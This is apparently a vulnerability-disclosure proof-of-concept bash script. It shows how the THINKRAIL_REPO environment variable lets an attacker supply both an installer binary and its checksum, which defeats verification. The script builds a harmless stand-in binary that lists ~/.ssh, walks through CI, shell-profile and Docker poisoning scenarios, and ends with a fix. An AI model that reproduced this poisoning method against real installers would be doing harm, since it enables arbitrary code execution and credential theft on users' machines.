#!/usr/bin/env bash
# PoC: Supply Chain Attack via THINKRAIL_REPO Environment Variable
#
# This script demonstrates how an attacker can serve a malicious binary
# through the install script by poisoning the THINKRAIL_REPO environment variable.
#
# IMPACT: Full arbitrary code execution as the installing user
#
# The install scripts (install.sh and install.ps1) download BOTH the binary AND the
# SHA256SUMS checksum from the same $THINKRAIL_REPO source. This means the checksum
# verification is self-referential: an attacker serves both the malicious binary and
# its matching checksum.
#
# USAGE:
#   chmod +x supply_chain_demo.sh
#   ./supply_chain_demo.sh
#
# This script does NOT actually install anything malicious — it only demonstrates
# the vulnerability by showing the attack flow.

set -euo pipefail

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║  PoC: Supply Chain Attack via THINKRAIL_REPO Env Variable  ║${NC}"
echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
echo

# --- Step 1: Show the vulnerable code ---
echo -e "${CYAN}[STEP 1] Vulnerable code in install.sh:${NC}"
echo -e "${YELLOW}"
echo '  Line 19: REPO="${THINKRAIL_REPO:-JetBrains/thinkrail}"'
echo
echo '  Lines 271-275:'
echo '  download_asset() {'
echo '      local name="$1" out="$2"'
echo '      curl -fL --progress-bar -o "$out" \'
echo '          "https://github.com/$REPO/releases/download/$TAG/$name"'
echo '  }'
echo
echo '  Lines 277-280:'
echo '  download_asset "$ASSET_NAME" "$TMP/$ASSET_NAME"  # Binary from $REPO'
echo '  download_asset "SHA256SUMS" "$TMP/SHA256SUMS"    # Checksum from SAME $REPO'
echo -e "${NC}"

echo -e "${RED}[VULN] Both the binary AND SHA256SUMS come from the same source!${NC}"
echo -e "${RED}[VULN] Checksum verification is self-referential — it proves nothing.${NC}"
echo

# --- Step 2: Demonstrate the attack flow ---
echo -e "${CYAN}[STEP 2] Attack simulation:${NC}"
echo

# Create a temporary directory for the demo
DEMO_DIR=$(mktemp -d)
trap "rm -rf $DEMO_DIR" EXIT

echo -e "${YELLOW}  Simulating attacker creating a malicious release...${NC}"

# Create a "malicious" binary (just a demo script)
cat > "$DEMO_DIR/thinkrail-linux-x64" << 'MALICIOUS_EOF'
#!/bin/bash
# MALICIOUS PAYLOAD — In a real attack, this would:
# - Install a backdoor
# - Exfiltrate SSH keys, API tokens, credentials
# - Add the attacker's SSH key to ~/.ssh/authorized_keys
# - Install a cryptocurrency miner
# - Modify git hooks to inject code into repositories
echo "[COMPROMISED] This binary was served from an attacker-controlled repo!"
echo "[COMPROMISED] Running as: $(whoami)@$(hostname)"
echo "[COMPROMISED] Home directory: $HOME"
echo "[COMPROMISED] SSH keys: $(ls ~/.ssh/ 2>/dev/null || echo 'none found')"
MALICIOUS_EOF
chmod +x "$DEMO_DIR/thinkrail-linux-x64"

# Generate a valid SHA256SUMS for the malicious binary
HASH=$(sha256sum "$DEMO_DIR/thinkrail-linux-x64" | awk '{print $1}')
echo "$HASH thinkrail-linux-x64" > "$DEMO_DIR/SHA256SUMS"

echo -e "${GREEN}  ✓ Created malicious binary: $DEMO_DIR/thinkrail-linux-x64${NC}"
echo -e "${GREEN}  ✓ Created matching SHA256SUMS: $HASH${NC}"
echo

# --- Step 3: Show checksum verification passes ---
echo -e "${CYAN}[STEP 3] Demonstrating self-referential checksum verification:${NC}"
echo

EXPECTED=$(awk -v name="thinkrail-linux-x64" '$2 == name {print $1; exit}' "$DEMO_DIR/SHA256SUMS")
ACTUAL=$(sha256sum "$DEMO_DIR/thinkrail-linux-x64" | awk '{print $1}')

echo -e "  Expected (from attacker's SHA256SUMS): ${YELLOW}$EXPECTED${NC}"
echo -e "  Actual (computed from malicious binary): ${YELLOW}$ACTUAL${NC}"

if [ "$EXPECTED" = "$ACTUAL" ]; then
    echo -e "${RED}"
    echo "  ✓ CHECKSUM MATCHES! The verification provides ZERO security."
    echo "  ✓ The install script would accept this malicious binary."
    echo -e "${NC}"
else
    echo -e "${GREEN}  ✗ Checksum mismatch (unexpected in this PoC)${NC}"
fi

# --- Step 4: Show attack scenarios ---
echo -e "${CYAN}[STEP 4] Real-world attack scenarios:${NC}"
echo
echo -e "${YELLOW}  Scenario 1: CI/CD Pipeline Poisoning${NC}"
echo "    In a shared CI/CD environment (GitHub Actions, Jenkins):"
echo "    - Job A sets: export THINKRAIL_REPO=attacker/malicious-repo"
echo "    - Job B runs: curl ... install.sh | bash"
echo "    - Result: Malicious binary installed with matching checksum"
echo
echo -e "${YELLOW}  Scenario 2: Shell Profile Injection${NC}"
echo "    Malware or trojan adds to ~/.bashrc:"
echo '    export THINKRAIL_REPO="evil-org/backdoored-thinkrail"'
echo "    Next time user runs the installer, they get the backdoored binary."
echo
echo -e "${YELLOW}  Scenario 3: Docker Base Image Compromise${NC}"
echo "    A compromised base image includes:"
echo "    ENV THINKRAIL_REPO=attacker/repo"
echo "    Any container built from this image gets the malicious binary."
echo

# --- Step 5: Show the fix ---
echo -e "${CYAN}[STEP 5] Fix:${NC}"
echo
echo -e "  ${GREEN}BEFORE (vulnerable):${NC}"
echo '    REPO="${THINKRAIL_REPO:-JetBrains/thinkrail}"'
echo
echo -e "  ${GREEN}AFTER (fixed):${NC}"
echo '    REPO="JetBrains/thinkrail"'
echo '    # Development override requires explicit --repo flag, not env var'
echo
echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${RED}  VULNERABILITY CONFIRMED: Supply chain attack is trivially   ${NC}"
echo -e "${RED}  exploitable. Checksum verification is completely bypassed.  ${NC}"
echo -e "${RED}═══════════════════════════════════════════════════════════════${NC}"
